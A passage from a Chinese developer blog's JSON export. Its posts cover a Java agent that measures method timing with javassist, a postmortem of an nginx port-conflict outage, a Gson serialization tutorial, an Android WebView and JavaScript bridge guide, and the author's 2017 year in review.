methodName = method.getLongName(); method.insertAfter(\"System.out.println(\\\"\" + methodName + \" cost: \\\" + (System\" + \".currentTimeMillis() - start));\"); } byte[] transformed = cl.toBytecode(); return transformed; } catch (Exception e) { e.printStackTrace(); } return classfileBuffer; }} 然后稍微改一下agent 12345678910111213141516171819202122232425262728293031323334353637383940/** * Created by @author yihui in 16:39 20/3/15. */public class SimpleAgent { /** * jvm 参数形式启动，运行此方法 * * manifest需要配置属性Premain-Class * * @param agentArgs * @param inst */ public static void premain(String agentArgs, Instrumentation inst) { System.out.println(\"premain\"); customLogic(inst); } /** * 动态 attach 方式启动，运行此方法 * * manifest需要配置属性Agent-Class * * @param agentArgs * @param inst */ public static void agentmain(String agentArgs, Instrumentation inst) { System.out.println(\"agentmain\"); customLogic(inst); } /** * 统计方法耗时 * * @param inst */ private static void customLogic(Instrumentation inst) { inst.addTransformer(new CostTransformer(), true); }} 到此agent完毕，打包和上面的过程一样，接下来进入测试环节 创建一个DemoClz， 里面两个方法 12345678910111213141516171819202122public class DemoClz { public int print(int i) { System.out.println(\"i: \" + i); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } return i + 2; } public int count(int i) { System.out.println(\"cnt: \" + i); try { Thread.sleep(50); } catch (InterruptedException e) { e.printStackTrace(); } return i + 1; }} 然后对应的main方法如下 12345678910111213public class BaseMain { public static void main(String[] args) throws InterruptedException { DemoClz demoClz = new DemoClz(); int cnt = 0; for (int i = 0; i &lt; 20; i++) { if (++cnt % 2 == 0) { i = demoClz.print(i); } else { i = demoClz.count(i); } } }} 选择jvm参数指定agent方式运行（具体操作和上面一样），输出如下 虽然我们的应用程序中并没有方法的耗时统计，但是最终的输出却完美的打印了每个方法的调用耗时，实现了无侵入的耗时统计功能 到这里本文的java agent的扫盲 + 实战（开发一个方法耗时统计）都已经完成了，是否就宣告着可以小结了，并不是，下面介绍一下在实现上面的demo过程中遇到的一个问题 3. Exception in thread “main” java.lang.VerifyError: Expecting a stack map frame在演示方法耗时的agent的示例中，并没有借助最开始的测试用例，而是新建了一个DemoClz来做的，那么为什么这样选择呢，如果直接用第二节的测试用例会怎样呢？ 12345678910111213141516171819202122public class BaseMain { public int print(int i) { System.out.println(\"i: \" + i); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } return i + 2; } public void run() { int i = 1; while (true) { i = print(i); } } public static void main(String[] args) { BaseMain main = new BaseMain(); main.run();} 依然通过jvm参数指定agent的方式，运行上面的代码，会发现抛异常，无法正常运行了 指出了在run方法这里，存在字节码的错误，我们统计耗时的Agent，主要就是在方法开始前和结束后各自新增了一行代码，我们直接补充在run方法中，则相当于下面的代码 上面的提示很明显的告诉了，最后一行语句永远不可能达到，编译就存在异常了；那么问题来了，作为一个java agent的提供者，我哪知道使用者有没有写这种死循环的方法，如果应用中有这么个死循环的任务存在，把我的agent一挂载上去，导致应用都起不来，这个锅算谁的？？？？ 下面提供解决方案，也很简单，在jvm参数中，添加一个-noverify (请注意不同的jdk版本，参数可能不一样，我的本地是jdk8，用这个参数；如果是jdk7可以试一下-XX:-UseSplitVerifier) 在IDEA开发环境下，如下配置即可 再次运行，正常了 4. 小结本篇为实战项目，首先明确方法参数Instrumentation它的接口定义，通过它来实现java 字节码的修改 我们通过实现自定义的ClassFileTransformer，借助javassist来修改字节码，为每个方法的第一行和最后一行注入耗时统计的代码，从而实现方法耗时统计 最后留一个小问题，上面的实现中，当方法内部抛出异常时，我们注入的最后一行统计耗时会不会如期输出，如果不会，应该怎么修改，欢迎各位大佬留言指出解决方案 （具体解决方案可以在源码中获取哦，还有配套的测试case，求支持，求赞，求关注❀） II. 其他0. 相关相关博文 200303-如何优雅的在java中统计代码块耗时 200316-IDEA + maven零基础构建java agent项目 相关源码 https://github.com/liuyueyi/java-agent 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/16/200316-手把手教你实现一个方法耗时统计的java-agent/"},{"title":"200727-线上故障实录-一大早服务就不可用了？","text":"难得一个周末，一大早还没有睡醒就接到另外一个团队的电话，app打不开了，所有的数据都没有了，睡意全无，赶紧起来看能不能紧急抢救一下，最终发现是一个关键链路的nginx配置错误，导致nginx无法启动，接下来完整的记录下愉快的周末中，这个不愉快的早晨 1. 项目环境首先说一下背景，出问题的这个项目是我之前参与的，现在由另外的小伙伴负责。这个项目使用nginx作为反向代理，因为某些业务上的原因，搞了一个香港和大陆之间的专线，下面又有一层的nginx进行不同业务的请求转发 后端服务基于SpringCloud微服务搭建，通过统一网关对外提供基本的业务服务; 也有部分服务不是通过网关，直接nginx转发过去的（比如内部使用的控制台就没有走网关） 大致的结构如上图，实际有一些区别，至于为什么选择这种架构设计，与实际的业务场景以及之前遭遇过的一次ddos有关，这个与本文主题关系不大，就不详细展开 2. 问题描述接下来我们先看一下出现的状况，运营的小伙伴最早接到反馈，app上所有的数据都没了，并提供了一个上次出现这种场景的原因是域名的证书过期 注意，这里有两个关键信息点 数据没有 -&gt; 直观反映是不是业务服务跪了导致的 证书过期 -&gt; 我们的域名采用的是let’s encrypt进行证书颁发，只有三个月的有效期，所以也不是不存在这种可能 3. 问题追踪前面是背景介绍，然后要开始进入正题，起床第一件事，呃并不是打开电脑，而是先打开appp看一下是个什么状况，毕竟不能完全凭运营一说，就开始找问题 app表现与运营同学描述一致，所有数据也空白，直观的表现就是服务端gg了 尝试解决思路 下面的文字相对冗长，基本思路可以参考下面这个图 先从运营同学提供的思路来看一下证书是否过期，直接浏览器输入app接口对应的一级域名xxx.com，结果发现被302到另外一个域名，还真的是证书过期，关键是这个也不是刚刚过期，而是过期了五十多天，这个时间对不上 既然一级域名没法直接查看，那就选择app直接请求接口的域名，来看一下是不是过期了，结果尴尬的事情是我不知道这个二级域名的前缀是啥（为了避免ddos，我们之前做的一个方案是随机生成了很多二级域名前缀，然后根据用户的地域进行二级域名的选取），所以只能通过抓包了 找到域名之后(假设为 xxx.a.com)，直接浏览器访问，毫无意外提示”无法访问此网络”，那这个域名证书是否过期就不好确定了 出现上面这个表现，自然而然的就是ping xxx.a.com，可以ping通，证明这个域名解析没有问题 简单的从域名上没有找到明显的突破口，接着去确认一下服务是否还在线，登录服务器，jps -l查看一下当前进程，结果居然发现居然没有zuul网关进程，难道是网关跪了导致的么，貌似有眉目了，在准备重启之前，看了一下日志，居然发现有正常的心跳日志，这特么的就鬼畜了啊，进程都没有，日志还在打；然后谨慎的用top看了一下服务器进程，zuul进程还在，不过坑爹的是它居然是root权限启动的；所以我用普通账号执行jps -l没有展示。针对这种状况，强烈建议所有的小伙伴，不要用root用户在服务器上搞事情 确定服务还在之后，使用curl http://127.0.0.1:8080/xxx来发出请求，正常响应，ok，服务没挂，那么问题就出现在上层 然后登录上层的几个nginx服务器，查看对应的nginx访问日志tail -f /var/log/nginx/access.log，以及异常日志tail -f /var/log/nginx/error.log，里面有几个之前的ssl验证失败的日志，好像也不是导致这个问题的原因 从日志文件上，看不出太多的信息，接着从最上层的nginx出发，ping域名，层层下推，结果发现到了某一台机器之后，ping了没反应，然后查看nginx.conf配置，起初是怀疑这里是不是被人动过了（虽然说可能性比较小），这个时候走了弯路，配置上看不出任何问题，然后下意思的查看了一下nginx进程ps aux | grep nginx，结果发现进程不在，原因找到 nginx进程为什么会突然没了，这个后面在说 4. 问题fix既然发现是因为nginx进程不再导致的原因，那就简单了，启动nginx就好了，结果发现nginx进程死活都起不来，一直提示80端口被占用, nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use) but no 80 process can find 遇到上面这个问题，要解决还不简单，找到占用80端口的进程，干掉它 1netstat -ntulp | grep 80 让人诧异的是，没有找到任何占用80端口的进程 网上搜索了一下，有不少小伙伴是通过下面这个命令解决的 NGINX BIND() TO 0.0.0.0:80 FAILED (98: ADDRESS ALREADY IN USE) 12# use fuser to kill process using port 80!fuser -k 80/tcp 很遗憾的是，使用上面这个命令依然没有能解决问题；这就很尴尬了啊，这个时候只能祭出我的大杀器了–重启服务器 1reboot 经过短暂的重启之后，再次启动nginx，嗯，依然没有解决问题；nginx居然死活起不来，这个问题就有点大发了，先解决线上问题让服务可用吧，临时调整了一下转发规则，把这台机器摘掉，操作完毕之后服务恢复 接下来我们的问题就是这个nginx为啥起不来 这里有一篇文章带来了一些思路 Fix nginx: [emerg] bind() to [::]:80 failed (98: Address already in use) 这个文章里面主要说的是在配置中，使用如下这种姿势导致端口占用 1234server { listen :80; listen [::]:80;} 对应提请的解决方案是只保留一个，或者在后面加一个ipv6的限定 12345678910server { listen 80; listen [::]:80 ipv6only=on;}# orserver { listen [::]:80;} 但是我的nginx配置中本来就只有一个listen 80，没有上面两个，讲道理不应该会冲突才对 注意到nginx.conf配置文件中有下面这一行 1234# Load modular configuration files from the /etc/nginx/conf.d directory.# See http://nginx.org/en/docs/ngx_core_module.html#include# for more information.include /etc/nginx/conf.d/*.conf; 难道是conf.d目录下的配置中，某个配置文件和最外面的冲突了导致的么，正好这个目录下只有一个配置文件，先干掉它 1234cd conf.dmv xxx.conf xxx.conf.bknginx 然后发现nginx顺利的起来了，通过再次查看，果然是上面这个原因导致的80端口冲突，调整一下即可；然后就剩下一个疑问，就这个配置，之前是怎么起来的（可能只有最开始部署这个的同学才知道了…） 最后揭晓一下，为啥这个nginx进程会挂掉，对于这个原因我也是很忧桑 5. 小结其实这个问题最后看来还是比较简单的，根本原因在于某个单点的nginx跪了，导致整个服务不可用，这也暴露了几个比较严重的缺陷 单点问题 监控缺失（核心链路的进程监控还是比较重要的，在整个问题的排查中，真没有想到会是nginx进程没有的情况） 短信要及时看，并提醒给相应的小伙伴（阿里云已经提醒了，可惜这条短信是在最后问题修复之后才告诉到负责这一块内容的小伙伴，这种事后，也就给我们排查为啥nginx跪了有点帮助了🐩） II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/07/27/200727-线上故障实录-一大早服务就不可用了/"},{"title":"200826-Gson 简单使用姿势小结","text":"关于Json序列化的框架可以说比较多了，比如Spring默认的Jackson，国内互联网用的比较多的FastJson，本文则主要介绍一下Gson的简单使用姿势，并不会涉及到不同的json框架的性能对比 本文主要内容来源于官方教程: https://github.com/google/gson/blob/master/UserGuide.md 1. 依赖导入首先我们借助maven来引入依赖包，按照自己的实际情况选择一个版本（简单的使用姿势与具体的版本并没有太大的关联性） 12&lt;groupId&gt;com.google.code.gson&lt;/groupId&gt;&lt;artifactId&gt;gson&lt;/artifactId&gt; 2. 基本的序列化与反序列化一般来讲，我们通过Gson对象来实现Json的序列化与反序列化，如下是几个简单的序列化与反序列化的case 123456789101112131415// SerializationGson gson = new Gson();gson.toJson(1); // ==&gt; 1gson.toJson(\"abcd\"); // ==&gt; \"abcd\"gson.toJson(new Long(10)); // ==&gt; 10int[] values = { 1 };gson.toJson(values); // ==&gt; [1]// Deserializationint one = gson.fromJson(\"1\", int.class);Integer one = gson.fromJson(\"1\", Integer.class);Long one = gson.fromJson(\"1\", Long.class);Boolean false = gson.fromJson(\"false\", Boolean.class);String str = gson.fromJson(\"\\\"abc\\\"\", String.class);String[] anotherStr = gson.fromJson(\"[\\\"abc\\\"]\", String[].class); 上面的case中，主要就是借助gson.toJson来输出Json字符串，借助gson.fromJson返序列化得到对象 3. 对象序列化对象的序列化与反序列化可以说是最常见的，在Gson的使用过程中，推荐的对象写法 filed：private 修饰 不希望序列化的成员，添加transient修饰符 默认无参构造方法(可选，这里跟人推荐保留，不同于FastJson的必须存在) 1234567891011121314151617181920212223242526272829303132public static class BaseBean { private int age; private String name; private transient int code; private String email; public BaseBean() { } @Override public String toString() { return \"BaseBean{\" + \"age=\" + age + \", name='\" + name + '\\'' + \", code=\" + code + \", email='\" + email + '\\'' + '}'; }}@Testpublic void testObjGson() { BaseBean bean = new BaseBean(); bean.age = 10; bean.code = 20; bean.name = \"一灰灰blog\"; Gson gson = new Gson(); String str = gson.toJson(bean); System.out.println(\"json str: \" + str); BaseBean out = gson.fromJson(str, BaseBean.class); System.out.println(\"after deserialization: \" + out);} 上面的使用姿势和前面并没有什么本质的区别，接下来看一下输出结果 12json str: {\"age\":10,\"name\":\"一灰灰blog\"}after deserialization: BaseBean{age=10, name='一灰灰blog', code=0, email='null'} 请注意： 输出json串时，null和transient修饰的成员不会输出到json串中 对象没有Get/Set方法，也依然可以反序列化(对象也没有继承自Serialize接口，当然我个人的观点是请继承Serialize接口) 如果我希望将null的成员，也可以输出到json串，可以如下操作 123// 并不直接创建Gson对象，改用GsonBuilderGson gsonWithNUll = new GsonBuilder().serializeNulls().create();System.out.println(\"serialize with null: \" + gsonWithNUll.toJson(bean)); 输出结果如下 1serialize with null: {\"age\":10,\"name\":\"一灰灰blog\",\"email\":null} 说明：如果希望扩展序列化方式，通过GsonBuilder来构建Gson对象是一个不错的选择 4. JsonObject与JsonArray某些场景下我们可能并没有定义反序列化的数据对象，比如FastJson中的直接反序列化为JSONObject/JSONArray，然后手动获取数据进行业务处理，这种场景下，gson可以如何支持呢？ 1234567891011121314151617Map map = new HashMap();map.put(\"a\", \"hello world\");map.put(12, true);map.put(\"array\", Arrays.asList(\"a\", \"c\", \"f\", 12));map.put(\"obj\", Maps.newHashMap(\"k\", \"v\"));Gson gson = new Gson();String str = gson.toJson(map);// 直接借助 JsonParser#parseString 来实现反序列化JsonObject obj = JsonParser.parseString(str).getAsJsonObject();String a = obj.get(\"a\").getAsString();boolean b = obj.get(\"12\").getAsBoolean();JsonArray ary = obj.get(\"array\").getAsJsonArray();JsonObject o = obj.get(\"obj\").getAsJsonObject();System.out.println(\"a:\" + a + \" b:\" + b + \" ary:\" + ary + \" o:\" + o); 请注意，我们这里主要借助的是JsonParser.parseString方法，输入参数可以是String也可以是流，返回的是JsonElement对象，这个对象比较有意思，提供了一些基础的类型输出方法如 getAsString: 返回String getAsInt: 返回int getAsJsonArray: 返回JsonArray（json数组） getAsJsonObject: 返回JsonObject (Json对象) … 5. 泛型序列化以上属于常规的基本使用姿势，实际的工作中，关于泛型的序列化和反序列化可以说非常常见了，那么应该如何处理呢 123456789101112131415161718192021222324252627282930public static class ResWrapper&lt;T&gt; { private T data; private int code; private String msg;}public static class User { private int age; private String name;}@Testpublic void testGenri() { ResWrapper&lt;User&gt; wrapper = new ResWrapper&lt;&gt;(); wrapper.code = 0; wrapper.msg = \"name\"; User user = new User(); user.age = 18; user.name = \"一灰灰\"; wrapper.data = user; Gson gson = new Gson(); String str = gson.toJson(wrapper); Type type = new TypeToken&lt;ResWrapper&lt;User&gt;&gt;() {}.getType(); ResWrapper&lt;User&gt; out = gson.fromJson(str, type); System.out.println(out);} 上面的核心在于Type的生成: new TypeToken&lt;ResWrapper&lt;User&gt;&gt;() {}.getType(); 6. 进阶以上内容基本上可以覆盖日常业务开发中90%的场景，当然gson也支持一些更高级的功能 如filed name映射 @SerializedName(&quot;custom_naming&quot;) 12345678910private class SomeObject { @SerializedName(\"custom_naming\") private final String someField; private final String someOtherField; public SomeObject(String a, String b) { this.someField = a; this.someOtherField = b; }} 如版本支持 @Since(1.1) 123456789101112131415161718192021public class VersionedClass { @Since(1.1) private final String newerField; @Since(1.0) private final String newField; private final String field; public VersionedClass() { this.newerField = \"newer\"; this.newField = \"new\"; this.field = \"old\"; }}VersionedClass versionedObject = new VersionedClass();Gson gson = new GsonBuilder().setVersion(1.0).create();String jsonOutput = gson.toJson(versionedObject);System.out.println(jsonOutput);System.out.println(); // 输出: {\"newField\":\"new\",\"field\":\"old\"}gson = new Gson();jsonOutput = gson.toJson(versionedObject);System.out.println(jsonOutput); // 输出: {\"newerField\":\"newer\",\"newField\":\"new\",\"field\":\"old\"} 自定义的类型转换 12345678910111213141516GsonBuilder gson = new GsonBuilder();gson.registerTypeAdapter(MyType.class, new DateTimeSerializer());gson.registerTypeAdapter(MyType.class, new DateTimeDeserializer());private class DateTimeSerializer implements JsonSerializer&lt;DateTime&gt; { public JsonElement serialize(DateTime src, Type typeOfSrc, JsonSerializationContext context) { return new JsonPrimitive(src.toString()); }}private class DateTimeDeserializer implements JsonDeserializer&lt;DateTime&gt; { public DateTime deserialize(JsonElement json, Type typeOfT, JsonDeserializationContext context) throws JsonParseException { return new DateTime(json.getAsJsonPrimitive().getAsString()); }} 可视化的json输出 12Gson gson = new GsonBuilder().setPrettyPrinting().create();String jsonOutput = gson.toJson(someObject); II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/08/26/200826-Gson-简单使用姿势小结/"},{"title":"200821-Android webview内嵌h5基础使用说明","text":"Android可以通过webview来内嵌html页面，从而实现灵活的信息展示；最近客串android开发中，正好遇到了这样的一个小场景，所以简单的记录一下Android与html之间的交互，包含以下内容 webview的基本设置 Andriod调用js方法 js调用android方法 图片长按下载 I. 内嵌html1. 布局我们这里主要介绍通过原生的WebView来嵌入Html网页，首先是在布局文件中，添加webview控件 12345&lt;WebView android:id=\"@+id/wv_detail\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" /&gt; 2. WebView配置在Activity类中，获取WebView控件 123// butterknife 方式，也可以直接通过 findViewById 获取@BindView(R.id.wv_detail)WebView webView; webview的基本配置参数，比如是否可以缩放，自适应等 1234567891011121314151617181920212223242526272829303132333435//声明WebSettings子类WebSettings webSettings = webView.getSettings();//如果访问的页面中要与Javascript交互，则webview必须设置支持JavascriptwebSettings.setJavaScriptEnabled(true);//支持插件webSettings.setPluginsEnabled(true);//设置自适应屏幕，两者合用webSettings.setUseWideViewPort(true); //将图片调整到适合webview的大小webSettings.setLoadWithOverviewMode(true); // 缩放至屏幕的大小//缩放操作webSettings.setSupportZoom(true); //支持缩放，默认为true。是下面那个的前提。webSettings.setBuiltInZoomControls(true); //设置内置的缩放控件。若为false，则该WebView不可缩放webSettings.setDisplayZoomControls(false); //隐藏原生的缩放控件//其他细节操作webSettings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK); //关闭webview中缓存webSettings.setAllowFileAccess(true); //设置可以访问文件webSettings.setJavaScriptCanOpenWindowsAutomatically(true); //支持通过JS打开新窗口webSettings.setLoadsImagesAutomatically(true); //支持自动加载图片webSettings.setDefaultTextEncodingName(\"utf-8\");//设置编码格式//重写shouldOverrideUrlLoading()方法，使得打开网页时不调用系统浏览器， 而是在本WebView中显示webView.setWebViewClient(new WebViewClient(){ @Override public boolean shouldOverrideUrlLoading(WebView view, String url) { view.loadUrl(url); return true; }}); 3. 回退与销毁内嵌html，当存在多个html页面跳转时，如果直接后退，可能的结果就是回到上一个activity，而不是我们预期的回到上一个html页面，因此我们需要处理一下回退事件 1234567891011@Overridepublic void onBackPressed() { if (webView == null) { return; } if (webView.canGoBack()) { webView.goBack(); return; } super.onBackPressed();} 其次在退出activity时，别忘了销毁WebView 123456789101112@Overrideprotected void onDestroy() { if (webView != null) { final ViewGroup viewGroup = (ViewGroup) webView.getParent(); if (viewGroup != null) { viewGroup.removeView(webView); } webView.destroy(); } super.onDestroy();} II. Android与JS交互1. 加载html基本配置完毕之后，开始加载html页面，主要是借助loadUrl来实现 12345// 加载assets 资源文件下htmlwebView.loadUrl(\"file:///android_asset/bs.html\");// 加载在线的htmlwebView.loadUrl(\"https://mweb.hhui.top/\") 2. js调用android方法为了实现js调用android方法，我们新建一个桥接类 1234567891011121314151617public class JsBrager { private Activity activity; public JsBrager(Activity activity) { this.activity = activity; } /** * 显示提示信息 * * @param message */ @JavascriptInterface public void toastMessage(String message) { Toast.makeText(activity, \"通过Natvie传递的Toast:\" + message, Toast.LENGTH_LONG).show(); }} 通过webView.addJavascriptInterface来关联 12// 请注意第二个参数，在js中使用`android.toastMessgae`来实现调用Android的方法webView.addJavascriptInterface(new JsBrager(this), \"android\"); 一个简单的html页面如 12345678910111213141516171819202122232425262728293031&lt;head&gt; &lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;h2&gt;简单的测试&lt;/h2&gt; &lt;/center&gt; &lt;div&gt; &lt;span&gt;&lt;img src=\"https://cdn.pixabay.com/photo/2015/05/26/22/33/kindle-785686_960_720.jpg\"/&gt;&lt;/span&gt; &lt;/div&gt; &lt;div&gt; &lt;h3&gt;Android Html交互：&lt;/h3&gt; &lt;button onclick=\"show()\" id='btn'&gt;toast&lt;/button&gt; &lt;/div&gt; &lt;br/&gt; &lt;script type=\"text/javascript\"&gt; function show() { android.toastMessage(\"js 点击\"); } function change_theme(bg, txt) { var body = document.getElementsByTagName('body')[0]; body.style.background = bg; body.style.color = txt; } function callJS() { return \"hello\"; } &lt;/script&gt;&lt;/body&gt; 3. android 调用js方法android 调用js方法，也是通过loadUrl来实现的，需要注意的前缀，以及是否需要传参返回结果 12// 修改主题色webview.loadUrl(\"javascript:change_theme('#ffffff','#000000')\"); 如果有返回结果，则可以考虑下面的写法 12345678// 只需要将第一种方法的loadUrl()换成下面该方法即可mWebView.evaluateJavascript（\"javascript:callJS()\", new ValueCallback&lt;String&gt;() { @Override public void onReceiveValue(String value) { //此处为 js 返回的结果 Toast.makeText(activity, \"js回调:\" + message, Toast.LENGTH_LONG).show(); }}); III. 长按图片下载 下面实现来自于搜索，忘了具体的来源了（主要还是习惯不好，拷代码，没有拷出处，我的锅）… 一种常见的case，长按图片下载，下面给出基本的额使用套路 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859handler = new Handler() { @Override public void handleMessage(Message msg) { super.handleMessage(msg); String picFile = (String) msg.obj; String[] split = picFile.split(\"/\"); String fileName = split[split.length - 1]; try { MediaStore.Images.Media.insertImage(getApplicationContext().getContentResolver(), picFile, fileName, null); } catch (FileNotFoundException e) { e.printStackTrace(); } // 最后通知图库更新 getApplicationContext().sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.parse(\"file://\" + picFile))); Toast.makeText(SquareDetailActivity.this, showContent(\"图片保存图库成功\"), Toast.LENGTH_LONG).show(); }};// 长按点击实现图片下载webView.setOnLongClickListener(new View.OnLongClickListener() { @Override public boolean onLongClick(View view) { final WebView.HitTestResult hitTestResult = webView.getHitTestResult(); // 如果是图片类型或者是带有图片链接的类型 if (hitTestResult.getType() == WebView.HitTestResult.IMAGE_TYPE || hitTestResult.getType() == WebView.HitTestResult.SRC_IMAGE_ANCHOR_TYPE) { // 弹出保存图片的对话框 AlertDialog.Builder builder = new AlertDialog.Builder(getContext()); builder.setTitle(\"提示\"); builder.setMessage(\"保存图片到本地\"); builder.setPositiveButton(LanguageFormatHelper.formatContent(\"确认\"), new DialogInterface.OnClickListener() { @Override public void onClick(DialogInterface dialogInterface, int i) { String url = hitTestResult.getExtra(); // 下载图片到本地 DownPicUtil.downPic(url, new DownPicUtil.DownFinishListener() { @Override public void getDownPath(String s) { Message msg = Message.obtain(); msg.obj = s; handler.sendMessage(msg); } }); } }); builder.setNegativeButton(LanguageFormatHelper.formatContent(\"取消\"), new DialogInterface.OnClickListener() { // 自动dismiss @Override public void onClick(DialogInterface dialogInterface, int i) { } }); AlertDialog dialog = builder.create(); dialog.show(); } return true; }}); 图片下载类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596/** * 图片下载的工具类 */public class DownPicUtil { /** * 下载图片，返回图片的地址 * * @param url */ public static void downPic(String url, DownFinishListener downFinishListener) { // 获取存储卡的目录 String filePath = Environment.getExternalStorageDirectory().getPath(); File file = new File(filePath + File.separator + \"webViewCache\"); if (!file.exists()) { file.mkdir(); } loadPic(file.getPath(), url, downFinishListener); } private static void loadPic(final String filePath, final String url, final DownFinishListener downFinishListener) { Log.e(\"下载图片的url\", url); new AsyncTask&lt;Void, Void, String&gt;() { String fileName; InputStream is; OutputStream out; @Override protected String doInBackground(Void... voids) { // 下载文件的名称 String[] split = url.split(\"/\"); String newString = split[split.length - 1]; if (newString.length() &gt;= 20) { fileName = newString.substring(newString.length() - 20, newString.length() - 1); } else { fileName = newString; } // 创建目标文件,不是文件夹 File picFile = new File(filePath + File.separator + fileName); if (picFile.exists()) { return picFile.getPath(); } try { URL picUrl = new URL(url); //通过图片的链接打开输入流 is = picUrl.openStream(); if (is == null) { return null; } out = new FileOutputStream(picFile); byte[] b = new byte[1024]; int end; while ((end = is.read(b)) != -1) { out.write(b, 0, end); } Log.e(\"OK??\", \"----------\"); if (is != null) { is.close(); } if (out != null) { out.close(); } } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } return picFile.getPath(); } @Override protected void onPostExecute(String s) { super.onPostExecute(s); if (s != null) { downFinishListener.getDownPath(s); } } }.execute(); } //下载完成回调的接口 public interface DownFinishListener { void getDownPath(String s); }} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/08/21/200821-Android-webview内嵌h5基础使用说明/"},{"title":"2017年全年回顾小结","text":"一月都过了快一半了，现在写17年的总结确实有点小晚，之前就准备好好的写一下的，却是因为各种琐碎的事情耽搁了，好在最近清闲了不少，基本上没啥事情可做，干脆好好的总结下17年的工作生活吧。 15年开始工作，17年呢，不再是职场新人，但是说到老鸟，却也相差甚远，工作的第二个年度，总感觉有些不温不火的，仔细看看这一年，尝试了很多东西，也做了一些事情，但总的来说，依然是达不到预期。 一个比较好的坚持下去的习惯就是每周一次的锻炼，虽然是因为小团队内的要求，不达标就罚款的前提定在这，所以努力的坚持了下来，还是值得表扬的。唯一和预期不一致的就是锻炼的效果好像不太明显，比去去年，体重确实又增加了不少。从工作来，体重可算是算着工作时长线性增加，有点可怕，感觉再这么下去，就没法玩了。坚持锻炼，努力运动，健康生活，依然是18年需要去维持的事情；此外也有必要，增加下运动的类型，除了跑步、骑车，还有那么多可以去尝试的活动，有必要去探索一下。 17年，与之前那么多年，最不同的有两件事，一个是入了王者荣耀的坑、变成了一个手游爱好者；还有一个就是写博客，每周最少一篇博文。然后这一年的常态就变成了每天晚上抱着手机玩游戏，每个周末跑到公司吭哧吭哧的写博文（当然有不少时候是为了写而写，所以有些内容比较难入眼）。这两件事情，则有必要好好的谈一下了。 首先是玩游戏这个，之前不怎么玩，挺浪费时间的，而且也没有什么特别有意思的，不知道什么时候开始接触农药，期间卸载了又重装了n次，现在水平依然很烂，仔细想了想自己，对于玩游戏有个奇怪的地方，不愿意去研究，到现在玩耍了大半年，依然不知道装备怎么出，不知道铭文怎么组合，反正都是随意玩，不管什么场景，顺风逆风，都是那么一套玩法，玩来玩去也就是那一个英雄（芈月）；一起玩的小伙伴已经荣升星曜，而我依然在黄金白银徘徊，简直了。其实从这个玩游戏的状态中也可以看出，我属于那种一旦熟悉了某种事务之后，不太愿意去更改、去变动的性格（总是玩一个英雄），主动专研能力不够（不看教程，不看视频…），脾气还不错（被坑了也不骂人）,还有就是定力不足（多次卸载游戏又重装）; (再次不得不说一句，感谢温柔漂亮的美人姣，非常理性的对待我玩游戏这一点） 另一个就是写博文了，这一年的写作，感觉比我上大学之后写的东西都要多了，差不多有八九十篇的样子了，之前抽空整理了个gitbook，挂在了私人服务器上: 小灰灰博文Book。写博文的收获其实挺大的，很多时候对于一个知识点，如果不尝试着去像其他人分享，你都不知道你到底掌握到什么程度了。而且如何才能写出一个漂亮的博文，真的没那么简单，这一年看了不少，有见过写的特别漂亮的，也看过写的不知道什么鬼的东西，当然现在我自己水平也不怎么样，但对比下前后的质量，发现还是有长进的。很多东西写着写着，会忽然发现一些平时没有注意的点。在这一块，感觉最主要的就是勤于总结，善于思考了。18年，这个坚持还是得继续下去的。因为写博文，当然为了避免玩单机，开通了头条号和公众号, 下面是链接，欢迎关注 谈到公众号，就有必要说一下与之相关的小程序了，小程序大火的时候，也进来玩了一下，做了两个，一个是《古诗选》，每天会推送十条古诗，而且可以根据关键词搜索相关古诗的小程序，感觉还蛮有意思的，结果等做完之后，告诉类目不对个人开放，简直了…；然后开始做第二个了，这个纯粹是为了实例验证我之前推的一个开源项目Quick-Media，主要提供图片、二维码、音视频处理服务，目前处于非常简陋的状态，通过写着两个小程序，最大的一个感受是，对于布局和样式这一块，实在是太不敏感了。 既然说到了开源项目，那也有必要提一下了，17年的一个收获就是做了几个有意思的开源项目，虽然不怎么成功，没什么人关注，但对个人的学习和收获还是很不错的。比如 提供SPI服务的Quick-Spi:https://github.com/liuyueyi/quick-spi，通过这个项目的实现，算是理解了spi到底是个什么东西，又可以怎么去玩； 